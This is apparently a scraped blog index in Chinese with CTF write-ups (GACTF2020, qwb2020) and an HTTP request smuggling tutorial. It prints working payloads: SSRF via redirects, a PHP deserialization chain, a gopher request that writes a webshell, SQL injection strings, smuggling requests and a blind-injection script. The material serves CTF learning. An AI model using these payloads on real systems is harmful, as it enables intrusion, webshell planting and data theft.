--\u0026gt; Add Frameworks Support --\u0026gt; 选中web application\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg loading=\"lazy\" src=\"image-20211114141525898.png\" alt=\"image-20211114141525898\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003e选中后会多出来几个东西, 如下图, 多了\u003ccode\u003eWEB-INF\u003c/code\u003e目录和\u003ccode\u003eindex.jsp\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"image-20211114141531496.png\" alt=\"image-20211114141531496\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eWeb-INF\u003c/code\u003e里面有只有一个\u003ccode\u003eweb.xml\u003c/code\u003e, 什么是\u003ccode\u003eWEB-INF\u003c/code\u003e? 根据百度百科的介绍\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eWEB-INF是Java的WEB应用的安全目录。所谓安全就是客户端无法访问，只有服务端可以访问的目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。\u003c/p\u003e\n\u003cp\u003eWEB-INF文件夹下除了web.xml外，还存一个classes文件夹，用以放置 *.class文件，这些 *.class文件是网站设计人员编写的类库，实现了jsp页面前台美工与后台服务的分离，使得网站的维护非常方便。web.xml文件为网站部署描述XML文件，对网站的部署非常重要。\u003c/p\u003e\n\u003cp\u003eWeb-Inf文件夹中除了有classes文件夹和一个web.xml文件外、还有lib文件夹（用于存放需要的jar包）（用于配置，比如说用来配置过滤器等。）\u003c/p\u003e\n\u003cp\u003e/WEB-INF/src/\n　　源码目录，按照包名结构放置各个java文件。\u003c/p\u003e\n\u003cp\u003e/WEB-INF/database.properties\n　　数据库配置文件\u003c/p\u003e\n\u003cp\u003e/WEB-INF/tags/\u003c/p\u003e\n\u003cp\u003e存放了自定义标签文件，该目录并不一定为 tags，可以根据自己的喜好和习惯为自己的标签文件库命名，当使用自定义的标签文件库名称时，在使用标签文件时就必须声明正确的标签文件库路径。例如：当自定义标签文件库名称为 simpleTags 时，在使用 simpleTags 目录下的标签文件时，就必须在 jsp 文件头声明为：\u0026lt;%@ taglibprefix=\u0026ldquo;tags\u0026rdquo; tagdir=\u0026quot;/WEB-INF /simpleTags\u0026quot; % \u0026gt;。\u003c/p\u003e\n\u003cp\u003e/WEB-INF/jsp/\u003c/p\u003e","title":"使用idea开启Servlet"},{"content":"simpleflask 和以往的flask不一样的地方在于, 这里是经过更新后的flask, 计算pin码的方式已经和以前不一样了, 参考 https://www.chainnews.com/articles/898433701852.htm, 不过问题不大,就把machine-id拼接在docker那一串东西的前面就可以了, 需要注意的是每十分钟重启时候的机器mac地址是会变化的.\nezflask 点击看到代码\n# -*- coding: utf-8 -*- from flask import Flask, request import requests from waf import * import time app = Flask(__name__) @app.route(\u0026#39;/ctfhint\u0026#39;) def ctf(): hint =xxxx # hints trick = xxxx # trick return trick @app.route(\u0026#39;/\u0026#39;) def index(): # app.txt @app.route(\u0026#39;/eval\u0026#39;, methods=[\u0026#34;POST\u0026#34;]) def my_eval(): # post eval @app.route(xxxxxx, methods=[\u0026#34;POST\u0026#34;]) # Secret def admin(): # admin requests # if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;,port=8080) 发现\u0026quot; ' [ ( 都被过滤了, 简直离谱\neval=ctf.__globals__ 来查看ctf函数所处在的命名空间下所能接触到的变量和函数\n{\u0026#39;my_eval\u0026#39;: \u0026lt;function my_eval at 0x7fb525c35dd0\u0026gt;, \u0026#39;app\u0026#39;: \u0026lt;Flask \u0026#39;app_1\u0026#39;\u0026gt;, \u0026#39;waf_eval\u0026#39;: \u0026lt;function waf_eval at 0x7fb525c35c50\u0026gt;, \u0026#39;admin\u0026#39;: \u0026lt;function admin at 0x7fb525b7f650\u0026gt;, \u0026#39;index\u0026#39;: \u0026lt;function index at 0x7fb525c35d50\u0026gt;, \u0026#39;waf_ip\u0026#39;: \u0026lt;function waf_ip at 0x7fb525c35b50\u0026gt;, \u0026#39;__builtins__\u0026#39;: \u0026lt;module \u0026#39;__builtin__\u0026#39; (built-in)\u0026gt;, \u0026#39;admin_route\u0026#39;: \u0026#39;/h4rdt0f1nd_9792uagcaca00qjaf\u0026#39;, \u0026#39;__file__\u0026#39;: \u0026#39;app_1.py\u0026#39;, \u0026#39;request\u0026#39;: \u0026lt;Request \u0026#39;http://124.70.206.91:10003/eval\u0026#39; [POST]\u0026gt;, \u0026#39;__package__\u0026#39;: None, \u0026#39;Flask\u0026#39;: \u0026lt;class \u0026#39;flask.app.Flask\u0026#39;\u0026gt;, \u0026#39;ctf\u0026#39;: \u0026lt;function ctf at 0x7fb525c35cd0\u0026gt;, \u0026#39;waf_path\u0026#39;: \u0026lt;function waf_path at 0x7fb525c35bd0\u0026gt;, \u0026#39;time\u0026#39;: \u0026lt;module \u0026#39;time\u0026#39; from \u0026#39;/usr/local/lib/python2.7/lib-dynload/time.so\u0026#39;\u0026gt;, \u0026#39;__name__\u0026#39;: \u0026#39;__main__\u0026#39;, \u0026#39;requests\u0026#39;: \u0026lt;module \u0026#39;requests\u0026#39; from \u0026#39;/usr/local/lib/python2.7/site-packages/requests/__init__.pyc\u0026#39;\u0026gt;, \u0026#39;__doc__\u0026#39;: None} 发现了admin_route, 然后那里是可以发起一个对外请求的, 经过测试发现127.0.0.1和0.0.0.0及其变形都会触发警告并退出, 盲猜这里考察的是302重定向, 在服务端那里写下\n\u0026lt;?php header(\u0026#34;Location: http://127.0.0.1:8080/\u0026#34;); ?\u0026gt; ssrf成功, 但是下一步干嘛呢?\n__code__, 函数的代码块\n__code__.co_consts 代码块中的所有常量的元组, 参考https://docs.python.org/3/library/inspect.html\neval=ctf.__code__.co_consts (None, \u0026#39;the admin route :h4rdt0f1nd_9792uagcaca00qjaf\u0026lt;!-- port : 5000 --\u0026gt;\u0026#39;, \u0026#39;too young too simple\u0026#39;) 然后通过302重定向访问127.0.0.1:5000, 是一个常规的ssti,再次重定向\nXWIKI 找到了CVE, 然后根据例子反弹shell后发现有一个二进制文件, 会给你很多选择题比较大小的, 到这里就做不出来了, 不过看到其他选手的脚本, 这里记录一下.\nuse strict; use IPC::Open3; my $pid = open3( \\*CHLD_IN, \\*CHLD_OUT, \\*CHLD_ERR, \u0026#39;/readflag\u0026#39; ) or die \u0026#34;open3() failed $!\u0026#34;; my $r; $r = \u0026lt;CHLD_OUT\u0026gt;; print \u0026#34;$r\u0026#34;; $r = \u0026lt;CHLD_OUT\u0026gt;; print \u0026#34;$r\u0026#34;; $r = eval \u0026#34;$r\u0026#34;; print \u0026#34;$r\\n\u0026#34;; print CHLD_IN \u0026#34;$r\\n\u0026#34;; $r = \u0026lt;CHLD_OUT\u0026gt;; print \u0026#34;$r\u0026#34;; $r = \u0026lt;CHLD_OUT\u0026gt;; print \u0026#34;$r\u0026#34;; carefuleyes 在改名的地方进行二次注入\nsd\u0026#39; or if(substr((select group_concat(username) from user where privilege=\u0026#39;admin\u0026#39;),1,1)=\u0026#39;X\u0026#39;,exp(5000),1)# 得到用户名和密码之后进行序列化登陆就可以了\n","permalink":"https://ch3n9w.github.io/posts/ctf-gactf2020/","summary":"\u003ch2 id=\"simpleflask\"\u003esimpleflask\u003c/h2\u003e\n\u003cp\u003e和以往的flask不一样的地方在于, 这里是经过更新后的flask, 计算pin码的方式已经和以前不一样了, 参考 \u003ca href=\"https://www.chainnews.com/articles/898433701852.htm\"\u003ehttps://www.chainnews.com/articles/898433701852.htm\u003c/a\u003e, 不过问题不大,就把machine-id拼接在docker那一串东西的前面就可以了, 需要注意的是每十分钟重启时候的机器mac地址是会变化的.\u003c/p\u003e","title":"GACTF2020"},{"content":"half_infiltration 开局的页面如下\n\u0026lt;?php highlight_file(__FILE__); $flag=file_get_contents(\u0026#39;ssrf.php\u0026#39;); class Pass { function read() { ob_start(); global $result; print $result; } } class User { public $age,$sex,$num; function __destruct() { $student = $this-\u0026gt;age; $boy = $this-\u0026gt;sex; $a = $this-\u0026gt;num; $student-\u0026gt;$boy(); if(!(is_string($a)) ||!(is_string($boy)) || !(is_object($student))) { ob_end_clean(); exit(); } global $$a; $result=$GLOBALS[\u0026#39;flag\u0026#39;]; ob_end_clean(); } } if (isset($_GET[\u0026#39;x\u0026#39;])) { unserialize($_GET[\u0026#39;x\u0026#39;])-\u0026gt;get_it(); } 思路是进行两次反序列化, 第一次将$_GLOBALS[\u0026lsquo;flag\u0026rsquo;]赋值给全局变量$result, 第二次反序列化是让程序在ob_end_clean()执行之前报错退出. ob_start会打开输出缓冲\n启用输出缓冲会导致PHP开始存储你输出的脚本而不是立即将它们发送到客户端。当脚本结束或者你调用了ob_flush()函数，PHP才会将内容发送到客户端。\nob_end_clean会将输出缓冲的内容进行一个清空, 那么如果要看到$result的内容的话, 我们就需要在ob_end_clean之前退出程序. 通过将$a赋值为this可以做到让程序报错退出.\n\u0026lt;?php class Pass{ function read(){ // ob_start(); global $result; print $result; } } class User{ public $age, $sex, $num; function __construct($a, $b, $c) { $this-\u0026gt;age = $a; $this-\u0026gt;sex = $b; $this-\u0026gt;num = $c; } } echo urlencode(serialize([ new User(new Pass(), \u0026#34;read\u0026#34;, \u0026#34;result\u0026#34;), new User(new Pass(), \u0026#34;read\u0026#34;, \u0026#34;this\u0026#34;) ])); ?\u0026gt; 然后我们可以看到ssrf.php的内容\n\u0026lt;?php //经过扫描确认35000以下端口以及50000以上端口不存在任何内网服务,请继续渗透内网 $url = $_GET[\u0026#39;we_have_done_ssrf_here_could_you_help_to_continue_it\u0026#39;] ?? false; if(preg_match(\u0026#34;/flag|var|apache|conf|proc|log/i\u0026#34; ,$url)){ die(\u0026#34;\u0026#34;); } if($url) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HEADER, 1); curl_exec($ch); curl_close($ch); } ?\u0026gt; 扫描发现\nhttp://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=http://127.0.0.1:40000/\n有东西\nHTTP/1.1 200 OK Date: Thu, 27 Aug 2020 13:04:07 GMT Server: Apache/2.4.18 (Ubuntu) Set-Cookie: PHPSESSID=60uap1c9tcik5f1ivmqqp933g2; path=/ Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate Pragma: no-cache Vary: Accept-Encoding Content-Length: 1121 Content-Type: text/html; charset=UTF-8 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Message Board\u0026lt;/title\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/bootstrap.min.css\u0026#34; /\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34; style=\u0026#34;text-align:center;vertical-align:middle;\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34; style=\u0026#34;text-align:center;vertical-align:middle;\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;Message Board \u0026lt;/h1\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;p class=\u0026#34;lead\u0026#34;\u0026gt; Since there is only one administrator, a person can only submit one opinion at a time. Each time a new opinion is submitted, all old comments will be deleted \u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;br\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34; style=\u0026#34;text-align:center;vertical-align:middle;\u0026#34;\u0026gt; \u0026lt;form method=\u0026#34;POST\u0026#34; class=\u0026#34;form-inline\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;form-group\u0026#34;\u0026gt; \u0026lt;input class=\u0026#39;form-control\u0026#39; type=\u0026#34;text\u0026#34; name=\u0026#34;file\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#39;panel-body\u0026#39;\u0026gt; \u0026lt;textarea class=\u0026#39;form-control\u0026#39; name=\u0026#39;content\u0026#39; rows=\u0026#39;6\u0026#39;\u0026gt;\u0026lt;/textarea\u0026gt; \u0026lt;br\u0026gt; \u0026lt;br\u0026gt; \u0026lt;div class=\u0026#34;form-group\u0026#34;\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34; class=\u0026#39;btn btn-default col-md-2 form-control\u0026#39; value=\u0026#34;Submit\u0026#34;\u0026gt;Submit\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; 同时\nhttp://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=http://127.0.0.1:40000/uploads/\n可以访问, 那么这里应该是上传东西到目录下面了.这里使用gopher协议来发送post上传文件, 这里依然会有一个过滤, 包括等号在内的几种符号和字母组合都被过滤了,使用二次编码协议来绕过.\nimport requests from urllib.parse import urlencode, quote_plus, quote url0 = \u0026#34;http://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=gopher://127.0.0.1:40000/_\u0026#34; upload_data = { \u0026#39;file\u0026#39;:\u0026#39;php://filter/convert.base64-decode|convert.base64-decode/resource=shell.php\u0026#39;, \u0026#39;content\u0026#39;:\u0026#39;UEQ4OVlHTmhkQ0F2Wm14aFoyQTc\u0026#39; # 似乎可以正常解密的base64都无法写入文件中 } upload_data = urlencode(upload_data, quote_via=quote_plus) print(upload_data) gopher_content = \u0026#39;\u0026#39;\u0026#39;POST / HTTP/1.1 Host: 127.0.0.1:40000 Cookie: PHPSESSID=hhhhhhhhhhhhhhhhhhhhhhhaaa; Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: {length} {data}\u0026#39;\u0026#39;\u0026#39;.format(length = len(upload_data), data=upload_data).replace(\u0026#39;\\n\u0026#39;, \u0026#39;\\r\\n\u0026#39;) # ssrf need double url encode url = url0 + quote(quote(gopher_content)) header = {\u0026#34;Upgrade-Insecure-Requests\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate\u0026#34;, \u0026#34;Accept-Language\u0026#34;: \u0026#34;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7\u0026#34;, \u0026#34;Connection\u0026#34;: \u0026#34;close\u0026#34;} while True: requests.get(url, headers=header) validate = \u0026#34;http://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=http://127.0.0.1:40000/uploads/hhhhhhhhhhhhhhhhhhhhhhhaaa/shell.php res = requests.get(validate) print(res.content) ","permalink":"https://ch3n9w.github.io/posts/ctf-qwb2020-web-1/","summary":"\u003ch2 id=\"half_infiltration\"\u003ehalf_infiltration\u003c/h2\u003e\n\u003cp\u003e开局的页面如下\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-php\" data-lang=\"php\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e\u0026lt;?\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ephp\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003ehighlight_file\u003c/span\u003e(\u003cspan style=\"color:#66d9ef\"\u003e__FILE__\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$flag\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003efile_get_contents\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ssrf.php\u0026#39;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eclass\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ePass\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003efunction\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eread\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#a6e22e\"\u003eob_start\u003c/span\u003e();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eglobal\u003c/span\u003e $result;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eprint\u003c/span\u003e $result;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eclass\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eUser\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003epublic\u003c/span\u003e $age,$sex,$num;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003efunction\u003c/span\u003e __destruct()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        $student \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e $this\u003cspan style=\"color:#f92672\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eage\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        $boy \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e $this\u003cspan style=\"color:#f92672\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003esex\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        $a \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e $this\u003cspan style=\"color:#f92672\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003enum\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    $student\u003cspan style=\"color:#f92672\"\u003e-\u0026gt;\u003c/span\u003e$boy();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e(\u003cspan style=\"color:#f92672\"\u003e!\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eis_string\u003c/span\u003e($a)) \u003cspan style=\"color:#f92672\"\u003e||!\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eis_string\u003c/span\u003e($boy)) \u003cspan style=\"color:#f92672\"\u003e||\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eis_object\u003c/span\u003e($student)))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#a6e22e\"\u003eob_end_clean\u003c/span\u003e();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eexit\u003c/span\u003e();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eglobal\u003c/span\u003e $$a;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    $result\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e$GLOBALS[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;flag\u0026#39;\u003c/span\u003e];\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#a6e22e\"\u003eob_end_clean\u003c/span\u003e();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003eisset\u003c/span\u003e($_GET[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;x\u0026#39;\u003c/span\u003e])) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eunserialize\u003c/span\u003e($_GET[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;x\u0026#39;\u003c/span\u003e])\u003cspan style=\"color:#f92672\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eget_it\u003c/span\u003e();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e} \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e思路是进行两次反序列化, 第一次将$_GLOBALS[\u0026lsquo;flag\u0026rsquo;]赋值给全局变量$result, 第二次反序列化是让程序在\u003ccode\u003eob_end_clean()\u003c/code\u003e执行之前报错退出. \u003ccode\u003eob_start\u003c/code\u003e会打开输出缓冲\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e启用输出缓冲会导致PHP开始存储你输出的脚本而不是立即将它们发送到客户端。当脚本结束或者你调用了ob_flush()函数，PHP才会将内容发送到客户端。\u003c/p\u003e","title":"qwb2020web复现"},{"content":"正常的请求\n请求走私, 攻击者通过在自己的请求中夹带一个请求, 来影响到下一个请求中, 一个典型的例子是反射型xss, 通过在上一次请求中走私一个请求头, 就可以在正常用户接下来进行的一次正常请求的过程中纂改其请求内容, 比如修改他的请求路径为一个反射性xss链接, 这样就可以达到让用户点击正常链接但是却触发xss链接的目的.\n其他的利用\n捕获用户请求 缓存投毒 绕过waf(夹带危险请求url, 并在下一次正常请求的时候触发) 绕过前端安全控制 首先要知道http发包过程中两个标头的意思\nContent-Length\n表示请求体的长度, 简称CL Content-Length: 10 8 HELLO 10个长度指的是以下内容的长度\n8\\r\\n HELLO\\r\\n Transfer-Encoding, 简称TE\n表示编码时使用的安全传输的形式有效载荷体 # 常见的几种 Transfer-Encoding: chunked Transfer-Encoding: compress Transfer-Encoding: deflate Transfer-Encoding: gzip Transfer-Encoding: identity 请求走私中一般用的都是chunked, 将消息正文视为使用分块编码.这里声明8字节长度, 经过一个换行后开始统计, 统计完8字节后经过一个换行表示下一个数据块开始, 长度为0, 被视为请求终止\nTransfer-Encoding: chunked 8 SMUGGLED 0 一个典型的请求如下\nHTTP/1.1 200 OK Content-Type: text/plain Transfer-Encoding: chunked 7\\r\\n Mozilla\\r\\n 9\\r\\n Developer\\r\\n 7\\r\\n Network\\r\\n 0\\r\\n \\r\\n 请求走私发生在存在前端服务器和后端服务器的情况下, 一般有这么几种\nCL-TE: 前端服务器识别的是Content_-Length, 后端服务器识别的是Transfer-Encoding TE-CL: 前端服务器识别的是Transfer-Encoding, 后端服务器识别的是Content-Length TE-TE: 前端服务器和后端服务器都是识别Transfer-Encoding的, 但是可以通过某种方式处理标头诱导一台服务器不对其进行处理 Transfer-Encoding: xchunked Transfer-Encoding : chunked Transfer-Encoding: chunked Transfer-Encoding: x Transfer-Encoding:[tab]chunked [space]Transfer-Encoding: chunked X: X[\\n]Transfer-Encoding: chunked Transfer-Encoding : chunked CL-TE POST / HTTP/1.1 Host: ac811f861fa3584f80e0998500f800dc.web-security-academy.net User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Cookie: session=6mA52yc42gmrXsBVf3gCCwaizRMowHXn Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 6 Transfer-Encoding: chunked 0 G 长度为6是因为0\\r\\n\\r\\nG, chunked看到0\\r\\n\\r\\n之后就结束接受了, 剩下来一个作为下一个请求头的开始\nTE-CL POST / HTTP/1.1 Host: ac4e1f3c1fe90e5480a44952006b00a0.web-security-academy.net User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Cookie: session=MDCGt1IHa1MdeOnP1wkjRX15gMuiEGT6 Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 4 Transfer-Encoding: chunked 12 GPOST / HTTP/1.1 0 chunked检测合理, 注意0\\r\\n\\r\\n是规定的结束格式, 然后后端只取12\\r\\n, 剩下来的东西就变成下一个请求的一部分\nTE-TE POST / HTTP/1.1 Host: ac731fb01fc279f280a00aac002d0026.web-security-academy.net User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Cookie: session=nGAfuCE6lQ9mnpysbHjt8yG3eO5XnU5S Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 4 Transfer-Encoding: chunked Transfer-Encoding: nothing 12 GPOST / HTTP/1.1 0 这里的情况是前端服务器以第一个TE为标准后端服务器以第二个为标准, 前端服务器通过之后, 后端服务器的TE值不存在, 就转而使用Content-Length为依据, 这个时候的情况就相当于TE-CL情况\n脚本示例 burpsuite有时候会失败, 用socket\n# 2019 高校运维赛 ezwaf # 使用cl-cl模式 两个content-length import socket ip = \u0026#39;111.186.57.43\u0026#39; port = 10601 def send_raw(raw): try: with socket.create_connection((ip, port), timeout=5) as conn: conn.send(raw) res = conn.recv(10240).decode() # print(res) return False except: return True if __name__ == \u0026#39;__main__\u0026#39;: res = \u0026#39;flag{abypass_modsecurity_\u0026#39; res = \u0026#34;\u0026#34; for i in range(1, 64): for j in range(32, 127): payload = \u0026#39;\u0026#39;\u0026#39;GET /?age=1%20or%201%20and%20ascii(substr((select%20*%20from%20flag_xdd),{},1))={}%20and%20sleep(7) HTTP/1.1 Host: 111.186.57.43:10601 Accept-Encoding: gzip, deflate Connection: close Content-Length: 0 Content-Length: 0 \u0026#39;\u0026#39;\u0026#39;.format(str(i), str(j)) exp = payload.encode().replace(b\u0026#39;\\n\u0026#39;, b\u0026#39;\\r\\n\u0026#39;) # print(exp) if send_raw(exp): res += chr(j) print(res) 